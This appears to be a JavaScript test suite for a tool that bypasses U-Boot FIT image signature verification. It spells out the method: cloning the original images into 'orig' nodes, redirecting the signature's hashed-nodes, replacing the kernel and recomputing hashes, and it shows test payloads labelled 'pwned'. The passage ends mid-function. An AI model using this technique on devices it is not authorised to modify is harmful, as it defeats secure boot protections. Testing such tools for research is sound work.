/**
 * Tests for FDT parser/serializer and FIT operations.
 *
 * Translated from ../fiti-image-exploit/test_fitpwn.py
 * Uses Node.js built-in test runner (node:test).
 */

const { describe, it, before } = require('node:test');
const assert = require('node:assert/strict');
const { webcrypto } = require('crypto');

const {
  FDT, FitOps, ShaFallback, buildTestFit, buildMinimalDtb, buildExternalDataFit,
} = require('./test-helpers');

// ---------------------------------------------------------------------------
// TestFitpwnSignatureBypass — structural equivalents
// (We can't run fit_check_sign, but we verify the tree manipulation is correct)
// ---------------------------------------------------------------------------
describe('SignatureBypass', () => {
  let fitBinary;
  let fitTree;

  before(async () => {
    const result = await buildTestFit();
    fitBinary = result.binary;
    fitTree = result.tree;
  });

  it('set_data clones original under /images/orig', async () => {
    const tree = FDT.parse(fitBinary);
    const imagesNode = FDT.findNode(tree.root, ['images']);

    await FitOps.root(fitBinary, { changeDtModel: false, replaceKernel: true, kernelData: new TextEncoder().encode('replaced kernel payload') });

    // Re-parse the output to verify structure
    const result = await FitOps.root(fitBinary, { changeDtModel: false, replaceKernel: true, kernelData: new TextEncoder().encode('replaced kernel payload') });
    const outTree = FDT.parse(result);
    const outImages = FDT.findNode(outTree.root, ['images']);

    // Must have a per-image container node
    const origNode = outImages.children.find(c => c.name === 'orig-kernel');
    assert.ok(origNode, 'Expected /images/orig-kernel node');

    // container must contain a clone of 'kernel'
    const origKernel = origNode.children.find(c => c.name === 'kernel');
    assert.ok(origKernel, 'Expected /images/orig-kernel/kernel node');

    // container must contain sentinel
    const sentinel = origNode.children.find(c => c.name === 'sentinel');
    assert.ok(sentinel, 'Expected /images/orig-kernel/sentinel node');
  });

  it('set_data appends (Pwnd) to description', async () => {
    const result = await FitOps.root(fitBinary, { changeDtModel: false, replaceKernel: true, kernelData: new TextEncoder().encode('replaced') });
    const outTree = FDT.parse(result);
    const kernel = FDT.findNode(outTree.root, ['images', 'kernel']);
    const desc = FDT.getStringProperty(kernel, 'description');
    assert.ok(desc.includes('(Pwnd)'), `Expected '(Pwnd)' in description, got: ${desc}`);
  });

  it('set_data redirects hashed-nodes in signatures', async () => {
    const result = await FitOps.root(fitBinary, { changeDtModel: false, replaceKernel: true, kernelData: new TextEncoder().encode('payload') });
    const outTree = FDT.parse(result);
    const sig = FDT.findNode(outTree.root, ['configurations', 'conf-1', 'signature-1']);
    const hashedNodes = FDT.getProperty(sig, 'hashed-nodes');
    const decoded = new TextDecoder().decode(hashedNodes);
    assert.ok(decoded.includes('/images/orig-kernel/kernel'), `hashed-nodes should reference /images/orig-kernel/kernel, got: ${decoded}`);
  });

  it('set_data sets compression to none', async () => {
    const result = await FitOps.root(fitBinary, { changeDtModel: false, replaceKernel: true, kernelData: new TextEncoder().encode('payload') });
    const outTree = FDT.parse(result);
    const kernel = FDT.findNode(outTree.root, ['images', 'kernel']);
    const compression = FDT.getStringProperty(kernel, 'compression');
    assert.equal(compression, 'none');
  });

  it('set_data recalculates hash-1 value', async () => {
    const payload = new TextEncoder().encode('hash test payload');
    const result = await FitOps.root(fitBinary, { changeDtModel: false, replaceKernel: true, kernelData: payload });
    const outTree = FDT.parse(result);
    const kernel = FDT.findNode(outTree.root, ['images', 'kernel']);
    const hashNode = kernel.children.find(c => c.name === 'hash-1');
    assert.ok(hashNode, 'Expected hash-1 node');

    const algo = FDT.getStringProperty(hashNode, 'algo');
    assert.equal(algo, 'sha256');

    const hashValue = FDT.getProperty(hashNode, 'value');
    const expected = new Uint8Array(await webcrypto.subtle.digest('SHA-256', payload));
    assert.deepEqual(hashValue, expected, 'Hash value mismatch');
  });
});

// ---------------------------------------------------------------------------
// TestExternalData
// ---------------------------------------------------------------------------
describe('ExternalData', () => {
  it('external data-offset/data-size are resolved to inline data', async () => {
    const extBinary = await buildExternalDataFit();
    const tree = FDT.parse(extBinary);
    FDT.resolveExternalData(tree.root, extBinary);

    const kernel = FDT.findNode(tree.root, ['images', 'kernel']);
    assert.ok(kernel, 'Expected /images/kernel');

    const data = FDT.getProperty(kernel, 'data');
    assert.ok(data, 'Expected data property after resolution');
    assert.equal(new TextDecoder().decode(data), 'hallo\n');

    // data-offset and data-size should be gone
    assert.equal(FDT.getProperty(kernel, 'data-offset'), null);
    assert.equal(FDT.getProperty(kernel, 'data-size'), null);
  });

  it('external FIT set_data produces valid inline FIT', async () => {
    const extBinary = await buildExternalDataFit();
    const result = await FitOps.root(extBinary, { changeDtModel: false, replaceKernel: true, kernelData: new TextEncoder().encode('external pwned') });
    const outTree = FDT.parse(result);
    const kernel = FDT.findNode(outTree.root, ['images', 'kernel']);
    const desc = FDT.getStringProperty(kernel, 'description');
    assert.ok(desc.includes('Pwnd'), `Expected 'Pwnd' in description, got: ${desc}`);

    // Data should now be inline (no data-offset)
    assert.ok(FDT.getProperty(kernel, 'data'), 'Expected inline data');
    assert.equal(FDT.getProperty(kernel, 'data-offset'), null);
  });
});

// ---------------------------------------------------------------------------
// TestCompression
// ---------------------------------------------------------------------------
describe('Compression', () => {
  it('after set_data, compression property is "none"', async () => {
    const { binary } = await buildTestFit();

    // First verify we can parse and the kernel has compression=none
    let tree = FDT.parse(binary);
    let kernel = FDT.findNode(tree.root, ['images', 'kernel']);
    assert.equal(FDT.getStringProperty(kernel, 'compression'), 'none');

    // Manually set compression to gzip, serialize, then run root()
    FDT.setProperty(kernel, 'compression', 'gzip');
    assert.equal(FDT.getStringProperty(kernel, 'compression'), 'gzip');
    const modified = FDT.serialize(tree);

    // Now root() should set compression back to none
    const result = await FitOps.root(modified, { changeDtModel: false, replaceKernel: true, kernelData: new TextEncoder().encode('uncompressed payload') });
    tree = FDT.parse(result);
    kernel = FDT.findNode(tree.root, ['images', 'kernel']);
    assert.equal(FDT.getStringProperty(kernel, 'compression'), 'none');
  });
});

// ---------------------------------------------------------------------------
// TestMultipleHashAlgos
// ---------------------------------------------------------------------------
describe('HashAlgorithms', () => {
  it('hash-1 value matches SHA256 of new data', async () => {
    const payload = new TextEncoder().encode('hash test payload');
    const { binary } = await buildTestFit();
    const result = await FitOps.root(binary, { changeDtModel: false, replaceKernel: true, kernelData: payload });

    const tree = FDT.parse(result);
    const kernel = FDT.findNode(tree.root, ['images', 'kernel']);
    const hashNode = kernel.children.find(c => c.name === 'hash-1');
    const algo = FDT.getStringProperty(hashNode, 'algo');
    assert.equal(algo, 'sha256');

    const value = FDT.getProperty(hashNode, 'value');
    const expected = new Uint8Array(await webcrypto.subtle.digest('SHA-256', payload));
    assert.deepEqual(value, expected);
  });

  it('CRC32 computation is correct', () => {
    const data = new TextEncoder().encode('test data');
    const result = FitOps.crc32(data);
    // JS and Python CRC32 of "test data"
    assert.equal(result, 0xD308AEB2);
  });

  it('SHA256 computation is correct', async () => {
    const data = new TextEncoder().encode('test data');
    const result = await FitOps.sha256(data);
    const expected = new Uint8Array(await webcrypto.subtle.digest('SHA-256', data));
    assert.deepEqual(result, expected);
  });
});

// ---------------------------------------------------------------------------
// TestNaiveModificationFails — verify structural invariants
// ---------------------------------------------------------------------------
describe('NaiveModification', () => {
  it('raw data patch changes hash mismatch', async () => {
    const { binary } = await buildTestFit();
    const data = new Uint8Array(binary);

    // Find "hallo" in binary and corrupt it
    const halloBytes = new TextEncoder().encode('hallo');
    let idx = -1;
    outer: for (let i = 0; i < data.length - 5; i++) {
      for (let j = 0; j < 5; j++) {
        if (data[i + j] !== halloBytes[j]) continue outer;
      }
      idx = i;
      break;
    }
    assert.notEqual(idx, -1, 'Could not find kernel data in FIT');

    // Corrupt the data
    const corrupted = new Uint8Array(data);
    corrupted.set(new TextEncoder().encode('XXXXX'), idx);

    // Parse and verify hash no longer matches
    const tree = FDT.parse(corrupted);
    const kernel = FDT.findNode(tree.root, ['images', 'kernel']);
    const kernelData = FDT.getProperty(kernel, 'data');
    const hashNode = kernel.children.find(c => c.name === 'hash-1');
    const storedHash = FDT.getProperty(hashNode, 'value');
    const actualHash = new Uint8Array(await webcrypto.subtle.digest('SHA-256', kernelData));

    // The stored hash should NOT match the actual data hash
    assert.notDeepEqual(storedHash, actualHash, 'Naive modification should cause hash mismatch');
  });

  it('data replacement without hash update causes mismatch', async () => {
    const { binary } = await buildTestFit();
    const tree = FDT.parse(binary);
    const kernel = FDT.findNode(tree.root, ['images', 'kernel']);

    // Replace data but don't update hash
    FDT.setProperty(kernel, 'data', new TextEncoder().encode('sneaky payload'));

    const serialized = FDT.serialize(tree);
    const tree2 = FDT.parse(serialized);
    const kernel2 = FDT.findNode(tree2.root, ['images', 'kernel']);
    const kernelData = FDT.getProperty(kernel2, 'data');
    const hashNode = kernel2.children.find(c => c.name === 'hash-1');
    const storedHash = FDT.getProperty(hashNode, 'value');
    const actualHash = new Uint8Array(await webcrypto.subtle.digest('SHA-256', kernelData));

    assert.notDeepEqual(storedHash, actualHash, 'Modification without hash update should cause mismatch');
  });

  it('hash update without orig clone leaves signature refs pointing at modified node', async () => {
    const { binary } = await buildTestFit();
    const tree = FDT.parse(binary);
    const kernel = FDT.findNode(tree.root, ['images', 'kernel']);
    const newData = new TextEncoder().encode('new kernel');

    // Update data and hash, but don't clone to orig or fix signature refs
    FDT.setProperty(kernel, 'data', newData);
    const hashNode = kernel.children.find(c => c.name === 'hash-1');
    const newHash = new Uint8Array(await webcrypto.subtle.digest('SHA-256', newData));
    FDT.setProperty(hashNode, 'value', newHash);

    const serialized = FDT.serialize(tree);
    const tree2 = FDT.parse(serialized);

    // Signature hashed-nodes should still point at /images/kernel (not /images/orig/kernel)
    const sig = FDT.findNode(tree2.root, ['configurations', 'conf-1', 'signature-1']);
    const hashedNodes = new TextDecoder().decode(FDT.getProperty(sig, 'hashed-nodes'));
    assert.ok(hashedNodes.includes('/images/kernel'), 'hashed-nodes should still point at original path');
    assert.ok(!hashedNodes.includes('/images/orig'), 'No orig redirect should exist without proper bypass');
  });
});

// ---------------------------------------------------------------------------
// FDT parse/serialize round-trip
// ---------------------------------------------------------------------------
describe('FDT round-trip', () => {
  it('parse then serialize produces valid DTB', () => {
    const dtb = buildMinimalDtb('Round Trip Board');
    const tree = FDT.parse(dtb);
    const reserialized = FDT.serialize(tree);

    // Parse again and verify
    const tree2 = FDT.parse(reserialized);
    assert.equal(FDT.getStringProperty(tree2.root, 'model'), 'Round Trip Board');
    assert.equal(FDT.getStringProperty(tree2.root, 'compatible'), 'test,board');
  });

  it('rejects non-DTB input', () => {
    assert.throws(
      () => FDT.parse(new Uint8Array([0, 0, 0, 0])),
      /Not a DTB.*bad magic/
    );
  });

  it('FIT validate detects missing /images node', () => {
    const tree = {
      header: { version: 17, last_comp_version: 16, boot_cpuid_phys: 0 },
      reserveEntries: [],
      root: { name: '', properties: [], children: [] },
    };
    const dtb = FDT.serialize(tree);
    const result = FitOps.validate(dtb);
    assert.equal(result.valid, false);
    assert.ok(result.error.includes('/images'));
  });

  it('FIT validate accepts well-formed FIT', async () => {
    const { binary } = await buildTestFit();
    const result = FitOps.validate(binary);
    assert.equal(result.valid, true);
    assert.equal(result.error, null);
    assert.equal(result.images.length, 2);
    assert.ok(result.hasSignatures);
  });
});

// ---------------------------------------------------------------------------
// DT model change
// ---------------------------------------------------------------------------
describe('DT model change', () => {
  it('root() with changeDtModel modifies nested DTB model', async () => {
    const { binary } = await buildTestFit();
    const result = await FitOps.root(binary, { changeDtModel: true, replaceKernel: false });
    const tree = FDT.parse(result);
    const fdtImg = FDT.findNode(tree.root, ['images', 'fdt-1']);
    const innerDtb = FDT.getProperty(fdtImg, 'data');
    const innerTree = FDT.parse(innerDtb);
    const model = FDT.getStringProperty(innerTree.root, 'model');
    assert.equal(model, 'Test Board [rooted by fitfall.de]');
  });

  it('all flat_dt images across configurations get /model changed', async () => {
    const binary = await buildMultiConfigFit();
    const result = await FitOps.root(binary, { changeDtModel: true, replaceKernel: false });
    const tree = FDT.parse(result);

    // Both fdt-1 and fdt-2 should have their /model changed
    for (const fdtName of ['fdt-1', 'fdt-2']) {
      const fdtImg = FDT.findNode(tree.root, ['images', fdtName]);
      assert.ok(fdtImg, `Expected /images/${fdtName}`);
      const dtData = FDT.getProperty(fdtImg, 'data');
      const innerTree = FDT.parse(dtData);
      const model = FDT.getStringProperty(innerTree.root, 'model');
      assert.ok(model.includes('[rooted by fitfall.de]'),
        `${fdtName} /model should be modified, got: ${model}`);
    }
  });

  it('DT model change creates orig node for fdt-1', async () => {
    const { binary } = await buildTestFit();
    const result = await FitOps.root(binary, { changeDtModel: true, replaceKernel: false });
    const tree = FDT.parse(result);
    const origNode = FDT.findNode(tree.root, ['images', 'orig-fdt-1']);
    assert.ok(origNode, 'Expected /images/orig-fdt-1');
    const origFdt = origNode.children.find(c => c.name === 'fdt-1');
    assert.ok(origFdt, 'Expected /images/orig-fdt-1/fdt-1');
  });

  it('/model in modified DTB differs from /model in original DTB', async () => {
    const { binary } = await buildTestFit();
    const result = await FitOps.root(binary, { changeDtModel: true, replaceKernel: false });
    const tree = FDT.parse(result);

    // Extract /model from the modified fdt-1 data
    const fdtImg = FDT.findNode(tree.root, ['images', 'fdt-1']);
    const modifiedDtb = FDT.getProperty(fdtImg, 'data');
    const modifiedTree = FDT.parse(modifiedDtb);
    const newModel = FDT.getStringProperty(modifiedTree.root, 'model');

    // Extract /model from the original fdt-1 preserved in orig container
    const origFdt = FDT.findNode(tree.root, ['images', 'orig-fdt-1', 'fdt-1']);
    const origDtb = FDT.getProperty(origFdt, 'data');
    const origTree = FDT.parse(origDtb);
    const origModel = FDT.getStringProperty(origTree.root, 'model');

    assert.equal(origModel, 'Test Board', 'Original /model should be preserved');
    assert.equal(newModel, 'Test Board [rooted by fitfall.de]', 'Modified /model should append rooting tag');
    assert.notEqual(origModel, newModel, '/model must differ between original and modified DTBs');
  });
});

// ---------------------------------------------------------------------------
// FDT property utilities
// ---------------------------------------------------------------------------
describe('FDT property utilities', () => {
  it('setProperty creates new property', () => {
    const node = { name: 'test', properties: [], children: [] };
    FDT.setProperty(node, 'foo', 'bar');
    assert.equal(FDT.getStringProperty(node, 'foo'), 'bar');
  });

  it('setProperty overwrites existing property', () => {
    const node = { name: 'test', properties: [], children: [] };
    FDT.setProperty(node, 'foo', 'bar');
    FDT.setProperty(node, 'foo', 'baz');
    assert.equal(FDT.getStringProperty(node, 'foo'), 'baz');
    assert.equal(node.properties.length, 1);
  });

  it('getProperty returns null for missing property', () => {
    const node = { name: 'test', properties: [], children: [] };
    assert.equal(FDT.getProperty(node, 'missing'), null);
  });

  it('cloneNode produces independent copy', () => {
    const enc = new TextEncoder();
    const node = {
      name: 'orig',
      properties: [{ name: 'data', data: enc.encode('hello') }],
      children: [{ name: 'child', properties: [], children: [] }],
    };
    const clone = FDT.cloneNode(node);

    // Modify clone
    clone.name = 'cloned';
    clone.properties[0].data = enc.encode('world');
    clone.children[0].name = 'modified-child';

    // Original should be unchanged
    assert.equal(node.name, 'orig');
    assert.equal(new TextDecoder().decode(node.properties[0].data), 'hello');
    assert.equal(node.children[0].name, 'child');
  });

  it('removeChild removes existing child', () => {
    const parent = {
      name: 'parent', properties: [],
      children: [
        { name: 'a', properties: [], children: [] },
        { name: 'b', properties: [], children: [] },
      ],
    };
    assert.equal(FDT.removeChild(parent, 'a'), true);
    assert.equal(parent.children.length, 1);
    assert.equal(parent.children[0].name, 'b');
  });

  it('removeChild returns false for missing child', () => {
    const parent = { name: 'parent', properties: [], children: [] };
    assert.equal(FDT.removeChild(parent, 'missing'), false);
  });
});

// ---------------------------------------------------------------------------
// String block preservation
// ---------------------------------------------------------------------------
describe('String block preservation', () => {
  it('serialize preserves original string block ordering', async () => {
    const { binary } = await buildTestFit();
    const tree = FDT.parse(binary);

    // Modify something to trigger re-serialization with new properties
    const kernel = FDT.findNode(tree.root, ['images', 'kernel']);
    FDT.setProperty(kernel, 'data', new TextEncoder().encode('modified'));

    const reserialized = FDT.serialize(tree);

    // Extract string blocks from both
    const origDv = new DataView(binary.buffer, binary.byteOffset, binary.byteLength);
    const origStrOff = origDv.getUint32(12);
    const origStrSize = origDv.getUint32(32);
    const origStrings = binary.slice(origStrOff, origStrOff + origStrSize);

    const newDv = new DataView(reserialized.buffer, reserialized.byteOffset, reserialized.byteLength);
    const newStrOff = newDv.getUint32(12);
    const newStrSize = newDv.getUint32(32);
    const newStrings = reserialized.slice(newStrOff, newStrOff + newStrSize);

    assert.equal(origStrSize, newStrSize, 'String block sizes should match');
    assert.deepEqual(origStrings, newStrings, 'String block contents should be identical');
  });

  it('bypass preserves string block for hashed-strings verification', async () => {
    const { binary } = await buildTestFit();

    const result = await FitOps.root(binary, {
      changeDtModel: false,
      replaceKernel: true,
      kernelData: new TextEncoder().encode('pwned kernel'),
    });

    // String blocks must match
    const origDv = new DataView(binary.buffer, binary.byteOffset, binary.byteLength);
    const origStrOff = origDv.getUint32(12);
    const origStrSize = origDv.getUint32(32);
    const origStrings = binary.slice(origStrOff, origStrOff + origStrSize);

    const newDv = new DataView(result.buffer, result.byteOffset, result.byteLength);
    const newStrOff = newDv.getUint32(12);
    const newStrSize = newDv.getUint32(32);
    const newStrings = result.slice(newStrOff, newStrOff + newStrSize);

    assert.equal(origStrSize, newStrSize, 'String block sizes should match after bypass');
    assert.deepEqual(origStrings, newStrings, 'String block should be preserved after bypass');
  });
});

// ---------------------------------------------------------------------------
// Per-image container ordering
// ---------------------------------------------------------------------------
describe('Per-image container ordering', () => {
  it('multi-bypass creates separate containers preserving node order', async () => {
    // Build a FIT with kernel, fdt, and ramdisk
    const enc = new TextEncoder();
    const kernel = enc.encode('kernel data');
    const fdt = buildMinimalDtb('Test Board');
    const ramdisk = enc.encode('ramdisk data');

    const kernelHash = new Uint8Array(await webcrypto.subtle.digest('SHA-256', kernel));
    const fdtHash = new Uint8Array(await webcrypto.subtle.digest('SHA-256', fdt));
    const ramdiskHash = new Uint8Array(await webcrypto.subtle.digest('SHA-256', ramdisk));

    function strProp(s) { return enc.encode(s + '\0'); }
    function u32Prop(v) {
      const b = new ArrayBuffer(4);
      new DataView(b).setUint32(0, v);
      return new Uint8Array(b);
    }

    const tree = {
      header: { version: 17, last_comp_version: 16, boot_cpuid_phys: 0 },
      reserveEntries: [],
      root: {
        name: '',
        properties: [
          { name: 'description', data: strProp('Multi-image FIT') },
          { name: '#address-cells', data: u32Prop(1) },
        ],
        children: [
          {
            name: 'images',
            properties: [],
            children: [
              {
                name: 'kernel',
                properties: [
                  { name: 'description', data: strProp('Linux Kernel') },
                  { name: 'data', data: new Uint8Array(kernel) },
                  { name: 'type', data: strProp('kernel') },
                  { name: 'arch', data: strProp('arm') },
                  { name: 'os', data: strProp('linux') },
                  { name: 'compression', data: strProp('none') },
                  { name: 'load', data: u32Prop(0x40008000) },
                  { name: 'entry', data: u32Prop(0x40008000) },
                ],
                children: [{
                  name: 'hash-1',
                  properties: [
                    { name: 'algo', data: strProp('sha256') },
                    { name: 'value', data: kernelHash },
                  ],
                  children: [],
                }],
              },
              {
                name: 'fdt-1',
                properties: [
                  { name: 'description', data: strProp('Device Tree') },
                  { name: 'data', data: new Uint8Array(fdt) },
                  { name: 'type', data: strProp('flat_dt') },
                  { name: 'arch', data: strProp('arm') },
                  { name: 'compression', data: strProp('none') },
                ],
                children: [{
                  name: 'hash-1',
                  properties: [
                    { name: 'algo', data: strProp('sha256') },
                    { name: 'value', data: fdtHash },
                  ],
                  children: [],
                }],
              },
              {
                name: 'ramdisk',
                properties: [
                  { name: 'description', data: strProp('Ramdisk') },
                  { name: 'data', data: new Uint8Array(ramdisk) },
                  { name: 'type', data: strProp('ramdisk') },
                  { name: 'arch', data: strProp('arm') },
                  { name: 'os', data: strProp('linux') },
                  { name: 'compression', data: strProp('none') },
                ],
                children: [{
                  name: 'hash-1',
                  properties: [
                    { name: 'algo', data: strProp('sha256') },
                    { name: 'value', data: ramdiskHash },
                  ],
                  children: [],
                }],
              },
            ],
          },
          {
            name: 'configurations',
            properties: [{ name: 'default', data: strProp('conf-1') }],
            children: [{
              name: 'conf-1',
              properties: [
                { name: 'description', data: strProp('Boot Config') },
                { name: 'kernel', data: strProp('kernel') },
                { name: 'fdt', data: strProp('fdt-1') },
                { name: 'ramdisk', data: strProp('ramdisk') },
              ],
              children: [{
                name: 'signature-1',
                properties: [
                  { name: 'algo', data: strProp('sha256,rsa2048') },
                  { name: 'key-name-hint', data: strProp('dev') },
                  { name: 'sign-images', data: enc.encode('kernel\0fdt\0ramdisk\0') },
                  { name: 'hashed-nodes', data: enc.encode(
                    '/\0/configurations/conf-1\0' +
                    '/images/kernel\0/images/kernel/hash-1\0' +
                    '/images/fdt-1\0/images/fdt-1/hash-1\0' +
                    '/images/ramdisk\0/images/ramdisk/hash-1\0'
                  )},
                ],
                children: [],
              }],
            }],
          },
        ],
      },
    };

    const binary = FDT.serialize(tree);

    // Bypass both kernel and ramdisk
    const result = await FitOps.root(binary, {
      changeDtModel: false,
      replaceKernel: true,
      kernelData: enc.encode('pwned kernel'),
      appendInitramfs: true,
      initramfsData: enc.encode('extra cpio'),
    });

    const outTree = FDT.parse(result);
    const images = FDT.findNode(outTree.root, ['images']);

    // Verify separate containers exist
    const kernelOrig = images.children.find(c => c.name === 'orig-kernel');
    const ramdiskOrig = images.children.find(c => c.name === 'orig-ramdisk');
    assert.ok(kernelOrig, 'Expected orig-kernel container');
    assert.ok(ramdiskOrig, 'Expected orig-ramdisk container');

    // Verify ordering: orig-kernel should come before fdt-1,
    // and orig-ramdisk should come after fdt-1
    const names = images.children.map(c => c.name);
    const kernelOrigIdx = names.indexOf('orig-kernel');
    const fdtIdx = names.indexOf('fdt-1');
    const ramdiskOrigIdx = names.indexOf('orig-ramdisk');

    assert.ok(kernelOrigIdx < fdtIdx,
      `orig-kernel (idx ${kernelOrigIdx}) should come before fdt-1 (idx ${fdtIdx})`);
    assert.ok(ramdiskOrigIdx > fdtIdx,
      `orig-ramdisk (idx ${ramdiskOrigIdx}) should come after fdt-1 (idx ${fdtIdx})`);

    // Verify hashed-nodes point to correct containers
    const sig = FDT.findNode(outTree.root, ['configurations', 'conf-1', 'signature-1']);
    const hashedNodes = new TextDecoder().decode(FDT.getProperty(sig, 'hashed-nodes'));
    assert.ok(hashedNodes.includes('/images/orig-kernel/kernel'),
      'hashed-nodes should reference orig-kernel container');
    assert.ok(hashedNodes.includes('/images/orig-ramdisk/ramdisk'),
      'hashed-nodes should reference orig-ramdisk container');
    assert.ok(!hashedNodes.includes('/images/kernel/'),
      'hashed-nodes should NOT reference original kernel path');
  });
});

// ---------------------------------------------------------------------------
// Multi-config helper
// ---------------------------------------------------------------------------

/**
 * Build a FIT with two configurations referencing different FDT images.
 *   conf-1: kernel + fdt-1 (Board A)
 *   conf-2: kernel + fdt-2 (Board B)
 * Both share the same kernel image.
 */
async function buildMultiConfigFit() {
  const enc = new TextEncoder();
  const kernel = enc.encode('kernel data');
  const fdt1 = buildMinimalDtb('Board A');
  const fdt2 = buildMinimalDtb('Board B');

  const kernelHash = new Uint8Array(await webcrypto.subtle.digest('SHA-256', kernel));
  const fdt1Hash = new Uint8Array(await webcrypto.subtle.digest('SHA-256', fdt1));
  const fdt2Hash = new Uint8Array(await webcrypto.subtle.digest('SHA-256', fdt2));

  function strProp(s) { return enc.encode(s + '\0'); }
  function u32Prop(v) {
    const b = new ArrayBuffer(4);
    new DataView(b).setUint32(0, v);
    return new Uint8Array(b);
  }

  const tree = {
    header: { version: 17, last_comp_version: 16, boot_cpuid_phys: 0 },
    reserveEntries: [],
    root: {
      name: '',
      properties: [
        { name: 'description', data: strProp('Multi-config FIT') },
        { name: '#address-cells', data: u32Prop(1) },
      ],
      children: [
        {
          name: 'images',
          properties: [],
          children: [
            {
              name: 'kernel',
              properties: [
                { name: 'description', data: strProp('Linux Kernel') },
                { name: 'data', data: new Uint8Array(kernel) },
                { name: 'type', data: strProp('kernel') },
                { name: 'arch', data: strProp('arm') },
                { name: 'os', data: strProp('linux') },
                { name: 'compression', data: strProp('none') },
                { name: 'load', data: u32Prop(0x40008000) },
                { name: 'entry', data: u32Prop(0x40008000) },
              ],
              children: [{
                name: 'hash-1',
                properties: [
                  { name: 'algo', data: strProp('sha256') },
                  { name: 'value', data: kernelHash },
                ],
                children: [],
              }],
            },
            {
              name: 'fdt-1',
              properties: [
                { name: 'description', data: strProp('Board A DTB') },
                { name: 'data', data: new Uint8Array(fdt1) },
                { name: 'type', data: strProp('flat_dt') },
                { name: 'arch', data: strProp('arm') },
                { name: 'compression', data: strProp('none') },
              ],
              children: [{
                name: 'hash-1',
                properties: [
                  { name: 'algo', data: strProp('sha256') },
                  { name: 'value', data: fdt1Hash },
                ],
                children: [],
              }],
            },
            {
              name: 'fdt-2',
              properties: [
                { name: 'description', data: strProp('Board B DTB') },
                { name: 'data', data: new Uint8Array(fdt2) },
                { name: 'type', data: strProp('flat_dt') },
                { name: 'arch', data: strProp('arm') },
                { name: 'compression', data: strProp('none') },
              ],
              children: [{
                name: 'hash-1',
                properties: [
                  { name: 'algo', data: strProp('sha256') },
                  { name: 'value', data: fdt2Hash },
                ],
                children: [],
              }],
            },
          ],
        },
        {
          name: 'configurations',
          properties: [{ name: 'default', data: strProp('conf-1') }],
          children: [
            {
              name: 'conf-1',
              properties: [
                { name: 'description', data: strProp('Board A config') },
                { name: 'kernel', data: strProp('kernel') },
                { name: 'fdt', data: strProp('fdt-1') },
              ],
              children: [{
                name: 'signature-1',
                properties: [
                  { name: 'algo', data: strProp('sha256,rsa2048') },
                  { name: 'key-name-hint', data: strProp('dev') },
                  { name: 'sign-images', data: enc.encode('kernel\0fdt\0') },
                  { name: 'hashed-nodes', data: enc.encode(
                    '/images/kernel\0/images/kernel/hash-1\0' +
                    '/images/fdt-1\0/images/fdt-1/hash-1\0'
                  )},
                ],
                children: [],
              }],
            },
            {
              name: 'conf-2',
              properties: [
                { name: 'description', data: strProp('Board B config') },
                { name: 'kernel', data: strProp('kernel') },
                { name: 'fdt', data: strProp('fdt-2') },
              ],
              children: [{
                name: 'signature-1',
                properties: [
                  { name: 'algo', data: strProp('sha256,rsa2048') },
                  { name: 'key-name-hint', data: strProp('dev') },
                  { name: 'sign-images', data: enc.encode('kernel\0fdt\0') },
                  { name: 'hashed-nodes', data: enc.encode(
                    '/images/kernel\0/images/kernel/hash-1\0' +
                    '/images/fdt-2\0/images/fdt-2/hash-1\0'
                  )},
                ],
                children: [],
              }],
            },
          ],
        },
      ],
    },
  };

  return FDT.serialize(tree);
}

// ---------------------------------------------------------------------------
// X.509 header magic detection
// ---------------------------------------------------------------------------
describe('X.509 detection', () => {
  it('image with 0x30 0x82 header is flagged as X.509', async () => {
    // Build a FIT with a firmware image whose data starts with X.509 DER magic
    const x509Data = new Uint8Array(64);
    x509Data[0] = 0x30;  // ASN.1 SEQUENCE
    x509Data[1] = 0x82;  // 2-byte length follows
    x509Data[2] = 0x00;
    x509Data[3] = 0x3C;  // length = 60

    const { binary } = await buildTestFit();
    // Parse, add an X.509 image, re-serialize
    const tree = FDT.parse(binary);
    const imagesNode = FDT.findNode(tree.root, ['images']);
    const enc = new TextEncoder();
    imagesNode.children.push({
      name: 'firmware-1',
      properties: [
        { name: 'description', data: enc.encode('OP-TEE with X.509\0') },
        { name: 'data', data: x509Data },
        { name: 'type', data: enc.encode('firmware\0') },
        { name: 'compression', data: enc.encode('none\0') },
      ],
      children: [],
    });
    const modified = FDT.serialize(tree);

    const result = FitOps.validate(modified);
    assert.equal(result.valid, true);

    const firmware = result.images.find(i => i.name === 'firmware-1');
    assert.ok(firmware, 'Expected firmware-1 image');
    assert.equal(firmware.isX509, true, 'firmware-1 should be flagged as X.509');
  });

  it('normal kernel image is not flagged as X.509', async () => {
    const { binary } = await buildTestFit();
    const result = FitOps.validate(binary);
    const kernel = result.images.find(i => i.name === 'kernel');
    assert.ok(kernel);
    assert.equal(kernel.isX509, false, 'kernel should not be flagged as X.509');
  });

  it('image with only first byte 0x30 is not flagged as X.509', async () => {
    const almostX509 = new Uint8Array(64);
    almostX509[0] = 0x30;
    almostX509[1] = 0x00;  // not 0x82

    const { binary } = await buildTestFit();
    const tree = FDT.parse(binary);
    const imagesNode = FDT.findNode(tree.root, ['images']);
    const enc = new TextEncoder();
    imagesNode.children.push({
      name: 'not-x509',
      properties: [
        { name: 'description', data: enc.encode('Not X.509\0') },
        { name: 'data', data: almostX509 },
        { name: 'type', data: enc.encode('firmware\0') },
        { name: 'compression', data: enc.encode('none\0') },
      ],
      children: [],
    });
    const modified = FDT.serialize(tree);

    const result = FitOps.validate(modified);
    const img = result.images.find(i => i.name === 'not-x509');
    assert.ok(img);
    assert.equal(img.isX509, false, 'Should not be flagged as X.509 without 0x82 second byte');
  });

  it('empty image data is not flagged as X.509', async () => {
    const { binary } = await buildTestFit();
    const tree = FDT.parse(binary);
    const imagesNode = FDT.findNode(tree.root, ['images']);
    const enc = new TextEncoder();
    imagesNode.children.push({
      name: 'empty-img',
      properties: [
        { name: 'description', data: enc.encode('Empty\0') },
        { name: 'data', data: new Uint8Array(0) },
        { name: 'type', data: enc.encode('firmware\0') },
        { name: 'compression', data: enc.encode('none\0') },
      ],
      children: [],
    });
    const modified = FDT.serialize(tree);

    const result = FitOps.validate(modified);
    const img = result.images.find(i => i.name === 'empty-img');
    assert.ok(img);
    assert.equal(img.isX509, false, 'Empty data should not be flagged as X.509');
  });
});

// ---------------------------------------------------------------------------
// SoCFPGA VAB detection
// ---------------------------------------------------------------------------
describe('VAB detection', () => {
  function buildVABImage(payloadSize) {
    // VAB layout: [payload] [SDM_CERT_MAGIC_LE (4)] [cert_body (certSz-4)] [certSz as LE u32 (4)]
    // cert starts at offset payloadSize with magic 0x25D04E7F
    const certBodySize = 60; // arbitrary certificate body
    const certSz = 4 + certBodySize; // magic + body
